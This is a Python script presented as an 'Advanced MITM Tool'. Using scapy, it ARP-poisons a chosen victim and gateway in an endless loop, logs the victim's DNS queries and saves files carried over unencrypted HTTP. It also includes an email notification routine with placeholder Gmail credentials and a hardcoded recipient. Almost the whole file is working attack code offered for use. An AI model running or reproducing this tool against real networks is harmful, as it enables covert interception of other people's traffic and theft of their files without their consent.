
import os
import sys
import threading
from scapy.all import ARP, send, sniff, conf, sr1, DNS, DNSQR, DNSRR, IP, UDP, TCP, Raw
from scapy.utils import wrpcap
import json
import re
from datetime import datetime
import smtplib
from email.mime.text import MIMEText
import ssl
import matplotlib.pyplot as plt

# Global variables
log_file = "mitm_integrated_log.txt"
pcap_file = "captured_traffic.pcap"
domains_file = "top_100000_domains.json"
export_folder = "captured_files/"
email_recipient = "hugokali25@gmail.com"

# Create export folder if not exists
os.makedirs(export_folder, exist_ok=True)

# Helper Functions
def log_event(event):
    with open(log_file, "a") as log:
        log.write(f"{datetime.now()} - {event}\n")
    print(event)

def save_packet(packet, filename):
    with open(os.path.join(export_folder, filename), "wb") as f:
        f.write(bytes(packet))
    log_event(f"Packet saved to {filename}")

def generate_report():
    log_event("Generating report...")
    report_file = os.path.join(export_folder, "report.pdf")
    plt.figure(figsize=(8, 6))
    data = {"HTTP Files": 30, "DNS Queries": 50, "Other Traffic": 20}  # Example data
    plt.bar(data.keys(), data.values(), color="skyblue")
    plt.title("Traffic Summary")
    plt.xlabel("Category")
    plt.ylabel("Count")
    plt.savefig(report_file)
    log_event(f"Report saved to {report_file}")

# ARP Spoofing
def arp_spoof(target_ip, gateway_ip, interface):
    conf.iface = interface
    victim_mac = get_mac(target_ip)
    gateway_mac = get_mac(gateway_ip)
    if not victim_mac or not gateway_mac:
        log_event("Cannot retrieve MAC addresses.")
        return
    try:
        log_event(f"Starting ARP Spoofing on {target_ip}...")
        while True:
            send(ARP(op=2, pdst=target_ip, psrc=gateway_ip, hwdst=victim_mac), verbose=False)
            send(ARP(op=2, pdst=gateway_ip, psrc=target_ip, hwdst=gateway_mac), verbose=False)
    except KeyboardInterrupt:
        log_event("Restoring ARP tables...")
        restore_arp(target_ip, gateway_ip, victim_mac, gateway_mac)

def restore_arp(target_ip, gateway_ip, victim_mac, gateway_mac):
    send(ARP(op=2, pdst=target_ip, psrc=gateway_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=gateway_mac), count=4)
    send(ARP(op=2, pdst=gateway_ip, psrc=target_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=victim_mac), count=4)

def get_mac(ip):
    arp_request = ARP(pdst=ip)
    response = sr1(arp_request, timeout=2, verbose=False)
    return response.hwsrc if response else None

# DNS Analysis
def dns_analyzer(packet):
    if packet.haslayer(DNSQR):
        queried_domain = packet[DNSQR].qname.decode()
        if queried_domain.strip(".") in load_top_domains():
            log_event(f"DNS Query Detected: {queried_domain}")

def load_top_domains():
    try:
        with open(domains_file, "r") as f:
            return set(json.load(f))
    except Exception as e:
        log_event(f"Failed to load top domains: {e}")
        return set()

# File Capture
def capture_files(packet):
    if packet.haslayer(Raw) and (b"Content-Disposition" in packet[Raw].load):
        filename = re.search(b'filename="(.+?)"', packet[Raw].load)
        if filename:
            save_packet(packet, filename.group(1).decode())

# Email Notification
def send_notification(subject, body):
    smtp_server = "smtp.gmail.com"
    port = 465
    sender_email = "your_email@gmail.com"
    password = "your_password"  # Replace with app password
    message = MIMEText(body)
    message["Subject"] = subject
    message["From"] = sender_email
    message["To"] = email_recipient
    context = ssl.create_default_context()
    try:
        with smtplib.SMTP_SSL(smtp_server, port, context=context) as server:
            server.login(sender_email, password)
            server.sendmail(sender_email, email_recipient, message.as_string())
    except Exception as e:
        log_event(f"Failed to send email: {e}")

# Main Menu
def main():
    print("Advanced MITM Tool")
    print("1. ARP Spoofing")
    print("2. DNS Analysis")
    print("3. File Capture")
    print("4. Generate Report")
    choice = input("Select an option: ")
    interface = input("Specify network interface (e.g., eth0): ")
    if choice == "1":
        target_ip = input("Enter victim IP: ")
        gateway_ip = input("Enter gateway IP: ")
        arp_spoof(target_ip, gateway_ip, interface)
    elif choice == "2":
        sniff(iface=interface, prn=dns_analyzer, filter="udp port 53")
    elif choice == "3":
        sniff(iface=interface, prn=capture_files, filter="tcp port 80")
    elif choice == "4":
        generate_report()
    else:
        print("Invalid option.")
        sys.exit(0)

if __name__ == "__main__":
    main()
